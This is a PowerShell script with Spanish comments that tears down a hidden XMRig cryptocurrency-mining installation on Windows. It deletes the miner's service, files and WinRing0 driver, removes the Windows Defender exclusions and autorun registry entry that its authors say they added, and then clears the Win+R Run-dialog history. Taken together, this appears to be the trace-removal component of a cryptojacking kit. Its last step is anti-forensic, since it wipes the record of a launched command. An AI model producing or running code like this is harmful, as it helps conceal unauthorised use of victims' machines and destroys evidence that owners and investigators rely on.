# =============================
# Configuración inicial
# =============================
$UserFolder = [Environment]::GetFolderPath("UserProfile")
$WikFolder = Join-Path $UserFolder "Wik"
$ServiceName = "RTK"
$XmrigRegName = "XMRigWik"
$XmrigRegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# =============================
# Detener y eliminar servicio RTK
# =============================
try {
    sc.exe query $ServiceName > $null 2>&1
    if ($LASTEXITCODE -eq 0) {
        sc.exe stop $ServiceName
        Start-Sleep -Seconds 2
        sc.exe delete $ServiceName
        Start-Sleep -Seconds 2
    }
} catch {}

# =============================
# Eliminar carpeta Wik y todo su contenido
# =============================
try {
    if (Test-Path $WikFolder) {
        Remove-Item -Path $WikFolder -Recurse -Force -ErrorAction SilentlyContinue
    }
} catch {}

# =============================
# Eliminar exclusiones de Windows Defender
# =============================
function Remove-DefenderExclusion($path) {
    try {
        $prefs = Get-MpPreference
        if ($prefs.ExclusionPath -contains $path) {
            Remove-MpPreference -ExclusionPath $path 2>$null
        }
        if ($prefs.ExclusionProcess -contains $path) {
            Remove-MpPreference -ExclusionProcess $path 2>$null
        }
    } catch {}
}

# Limpiar todas las exclusiones que agregamos
Remove-DefenderExclusion $WikFolder
Remove-DefenderExclusion (Join-Path $WikFolder "RTK.exe")
Remove-DefenderExclusion (Join-Path $WikFolder "wroom.dll")
Remove-DefenderExclusion (Join-Path $WikFolder "WinRing0x64.sys")
Remove-DefenderExclusion (Join-Path $WikFolder "xmrig.exe")

# =============================
# Eliminar entrada de XMRig en inicio
# =============================
try {
    if (Get-ItemProperty -Path $XmrigRegPath -Name $XmrigRegName -ErrorAction SilentlyContinue) {
        Remove-ItemProperty -Path $XmrigRegPath -Name $XmrigRegName -ErrorAction SilentlyContinue
    }
} catch {}

# =============================
# Limpiar historial de Win + R
# =============================
try {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
    if (Test-Path $regPath) {
        Remove-ItemProperty -Path $regPath -Name "MRUList" -ErrorAction SilentlyContinue
        Get-ItemProperty -Path $regPath | ForEach-Object {
            $_.PSObject.Properties | Where-Object { $_.Name -ne "PSPath" -and $_.Name -ne "PSParentPath" -and $_.Name -ne "PSChildName" -and $_.Name -ne "PSDrive" -and $_.Name -ne "PSProvider" } | ForEach-Object {
                Remove-ItemProperty -Path $regPath -Name $_.Name -ErrorAction SilentlyContinue
            }
        }
    }
} catch {}
